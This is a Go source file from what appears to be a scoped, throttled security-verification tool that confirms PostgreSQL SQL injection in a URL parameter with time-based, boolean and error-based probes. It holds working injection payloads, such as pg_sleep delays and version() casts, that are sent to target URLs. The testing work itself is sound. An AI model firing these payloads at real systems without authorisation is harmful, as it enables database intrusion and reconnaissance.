package verify

import (
	"fmt"
	"net/url"
	"os"
	"regexp"

	"github.com/srank/ensphere/internal/evidence"
)

const defaultRounds = 3

// SQLi payload templates keyed by technique + boundary
var sqliPayloads = map[string]map[string]string{
	"blind_time": {
		"single_quote": "' AND (SELECT pg_sleep(%d))--",
		"double_quote": "\" AND (SELECT pg_sleep(%d))--",
		"numeric":      "1; SELECT pg_sleep(%d)--",
	},
	"blind_boolean": {
		"single_quote_true":  "' AND 1=1--",
		"single_quote_false": "' AND 1=2--",
		"double_quote_true":  "\" AND 1=1--",
		"double_quote_false": "\" AND 1=2--",
	},
	"error_based": {
		"single_quote": "' AND 1=CAST((SELECT version()) AS int)--",
		"double_quote": "\" AND 1=CAST((SELECT version()) AS int)--",
		"numeric":      "1 AND 1=CAST((SELECT version()) AS int)",
	},
}

// PG error patterns
var pgErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)ERROR:`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)invalid input syntax`),
	regexp.MustCompile(`(?i)unterminated quoted string`),
	regexp.MustCompile(`(?i)column .+ does not exist`),
}

// SQLiConfig holds configuration specific to SQLi verification.
type SQLiConfig struct {
	URL       string
	Param     string
	Technique string // blind_time | blind_boolean | error_based
	Method    string // GET | POST
	Boundary  string // single_quote | double_quote | numeric
	ProbeConfig
}

// VerifySQLi runs the SQLi verification probe.
func VerifySQLi(cfg SQLiConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	switch cfg.Technique {
	case "blind_time":
		return verifySQLiBlindTime(cfg, throttle, timer, ew)
	case "blind_boolean":
		return verifySQLiBlindBoolean(cfg, throttle, timer, ew)
	case "error_based":
		return verifySQLiErrorBased(cfg, throttle, timer, ew)
	default:
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: blind_time, blind_boolean, error_based", cfg.Technique)}
	}
}

func verifySQLiBlindTime(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*ProbeResult, error) {
	sleepSec := cfg.TimeoutSec / 2
	if sleepSec < 3 {
		sleepSec = 3
	}
	if sleepSec > cfg.TimeoutSec-2 {
		sleepSec = cfg.TimeoutSec - 2
	}

	payloadTemplate := sqliPayloads["blind_time"][cfg.Boundary]
	if payloadTemplate == "" {
		return nil, &ScopeError{Msg: fmt.Sprintf("no blind_time payload for boundary %q", cfg.Boundary)}
	}

	probeCount := 0

	// Baseline probes
	var baselineRounds []RoundResult
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := probeWithParam(cfg, "1")
		if resp.Error != nil {
			return nil, fmt.Errorf("baseline probe %d: %w", i+1, resp.Error)
		}
		baselineRounds = append(baselineRounds, RoundResult{
			StatusCode: resp.StatusCode,
			ElapsedMs:  resp.ElapsedMs,
			BodyHash:   resp.BodyHash,
			BodyLength: len(resp.Body),
		})
		fmt.Fprintf(os.Stderr, "[BASELINE %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "sqli", "blind_time", cfg.URL, cfg.Param, resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "baseline", fmt.Sprintf("round %d", i+1))
	}

	// Payload probes (pg_sleep)
	payload := fmt.Sprintf(payloadTemplate, sleepSec)
	var payloadRounds []RoundResult
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := probeWithParam(cfg, payload)
		if resp.Error != nil {
			fmt.Fprintf(os.Stderr, "[PAYLOAD %d] error: %v\n", i+1, resp.Error)
			continue
		}
		payloadRounds = append(payloadRounds, RoundResult{
			StatusCode: resp.StatusCode,
			ElapsedMs:  resp.ElapsedMs,
			BodyHash:   resp.BodyHash,
			BodyLength: len(resp.Body),
		})
		fmt.Fprintf(os.Stderr, "[PAYLOAD %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "sqli", "blind_time", cfg.URL, cfg.Param, resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "payload", fmt.Sprintf("round %d, payload: %s", i+1, payload))
	}

	if len(payloadRounds) == 0 {
		return nil, fmt.Errorf("all payload probes failed")
	}

	baselineAvg := avgFromRounds(baselineRounds)
	payloadAvg := avgFromRounds(payloadRounds)

	return &ProbeResult{
		SchemaVersion: 2,
		VulnType:      "sqli",
		Technique:     "blind_time",
		StartedAt:     timer.StartedAt(),
		ProbeCount:    probeCount,
		Duration:      timer.Elapsed(),
		Measurements: SQLiTimeMeasurements{
			SleepSeconds:   sleepSec,
			BaselineRounds: baselineRounds,
			PayloadRounds:  payloadRounds,
			BaselineAvgMs:  baselineAvg,
			PayloadAvgMs:   payloadAvg,
			DeltaMs:        payloadAvg - baselineAvg,
			PayloadUsed:    payload,
			StringBoundary: cfg.Boundary,
		},
	}, nil
}

func verifySQLiBlindBoolean(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*ProbeResult, error) {
	trueKey := cfg.Boundary + "_true"
	falseKey := cfg.Boundary + "_false"

	truePayload := sqliPayloads["blind_boolean"][trueKey]
	falsePayload := sqliPayloads["blind_boolean"][falseKey]
	if truePayload == "" || falsePayload == "" {
		return nil, &ScopeError{Msg: fmt.Sprintf("no blind_boolean payloads for boundary %q", cfg.Boundary)}
	}

	probeCount := 0

	// Baseline
	throttle.Wait()
	probeCount++
	baselineResp := probeWithParam(cfg, "1")
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline: %w", baselineResp.Error)
	}
	baselineRound := RoundResult{
		StatusCode: baselineResp.StatusCode,
		ElapsedMs:  baselineResp.ElapsedMs,
		BodyHash:   baselineResp.BodyHash,
		BodyLength: len(baselineResp.Body),
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] hash=%s\n", baselineResp.BodyHash[:16])
	writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "")

	// True/False probes across rounds
	var trueRounds, falseRounds []RoundResult
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		trueResp := probeWithParam(cfg, truePayload)
		if trueResp.Error != nil {
			continue
		}
		throttle.Wait()
		probeCount++
		falseResp := probeWithParam(cfg, falsePayload)
		if falseResp.Error != nil {
			continue
		}
		fmt.Fprintf(os.Stderr, "[ROUND %d] true=%s false=%s\n", i+1, trueResp.BodyHash[:16], falseResp.BodyHash[:16])
		writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, trueResp.StatusCode,
			fmt.Sprintf("%dms", trueResp.ElapsedMs), "true_probe", fmt.Sprintf("round %d", i+1))
		writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, falseResp.StatusCode,
			fmt.Sprintf("%dms", falseResp.ElapsedMs), "false_probe", fmt.Sprintf("round %d", i+1))
		trueRounds = append(trueRounds, RoundResult{
			StatusCode: trueResp.StatusCode, ElapsedMs: trueResp.ElapsedMs,
			BodyHash: trueResp.BodyHash, BodyLength: len(trueResp.Body),
		})
		falseRounds = append(falseRounds, RoundResult{
			StatusCode: falseResp.StatusCode, ElapsedMs: falseResp.ElapsedMs,
			BodyHash: falseResp.BodyHash, BodyLength: len(falseResp.Body),
		})
	}

	if len(trueRounds) == 0 || len(falseRounds) == 0 {
		return nil, fmt.Errorf("all boolean probes failed")
	}

	hashesMatch := trueRounds[0].BodyHash == falseRounds[0].BodyHash

	return &ProbeResult{
		SchemaVersion: 2,
		VulnType:      "sqli",
		Technique:     "blind_boolean",
		StartedAt:     timer.StartedAt(),
		ProbeCount:    probeCount,
		Duration:      timer.Elapsed(),
		Measurements: SQLiBooleanMeasurements{
			BaselineRound:  baselineRound,
			TrueRounds:     trueRounds,
			FalseRounds:    falseRounds,
			HashesMatch:    hashesMatch,
			TruePayload:    truePayload,
			FalsePayload:   falsePayload,
			StringBoundary: cfg.Boundary,
		},
	}, nil
}

func verifySQLiErrorBased(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*ProbeResult, error) {
	payload := sqliPayloads["error_based"][cfg.Boundary]
	if payload == "" {
		return nil, &ScopeError{Msg: fmt.Sprintf("no error_based payload for boundary %q", cfg.Boundary)}
	}

	probeCount := 0

	throttle.Wait()
	probeCount++
	resp := probeWithParam(cfg, payload)
	if resp.Error != nil {
		return nil, fmt.Errorf("error_based probe: %w", resp.Error)
	}

	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d\n", resp.StatusCode, len(resp.Body))
	writeEvidence(ew, "sqli", "error_based", cfg.URL, cfg.Param, resp.StatusCode,
		fmt.Sprintf("%dms", resp.ElapsedMs), "probe", payload)

	// Check for PG error signatures — collect all matches
	var matchedPatterns []string
	for _, re := range pgErrorPatterns {
		if re.MatchString(resp.Body) {
			matchedPatterns = append(matchedPatterns, re.String())
		}
	}

	snippet := resp.Body
	if len(snippet) > 500 {
		snippet = snippet[:500]
	}

	probeRound := RoundResult{
		StatusCode: resp.StatusCode,
		ElapsedMs:  resp.ElapsedMs,
		BodyHash:   resp.BodyHash,
		BodyLength: len(resp.Body),
	}

	return &ProbeResult{
		SchemaVersion: 2,
		VulnType:      "sqli",
		Technique:     "error_based",
		StartedAt:     timer.StartedAt(),
		ProbeCount:    probeCount,
		Duration:      timer.Elapsed(),
		Measurements: SQLiErrorMeasurements{
			ProbeRound:      probeRound,
			MatchedPatterns: matchedPatterns,
			PayloadUsed:     payload,
			StringBoundary:  cfg.Boundary,
			ResponseSnippet: snippet,
		},
	}, nil
}

// probeWithParam injects a value into the target URL parameter and sends the request.
func probeWithParam(cfg SQLiConfig, value string) ProbeResponse {
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		return ProbeResponse{Error: fmt.Errorf("parse URL: %w", err)}
	}

	params := parsed.Query()
	params.Set(cfg.Param, value)
	parsed.RawQuery = params.Encode()

	return HTTPProbe(cfg.Method, parsed.String(), "", cfg.Headers, cfg.TimeoutSec)
}

func writeEvidence(ew *evidence.Writer, probeType, technique, url, param string, statusCode int, duration, result, notes string) {
	if ew == nil {
		return
	}
	entry := evidence.NewEntry(probeType, technique, url, param, statusCode, duration, result, notes)
	_ = ew.Write(entry)
}

func avgFromRounds(rounds []RoundResult) int64 {
	if len(rounds) == 0 {
		return 0
	}
	var sum int64
	for _, r := range rounds {
		sum += r.ElapsedMs
	}
	return sum / int64(len(rounds))
}
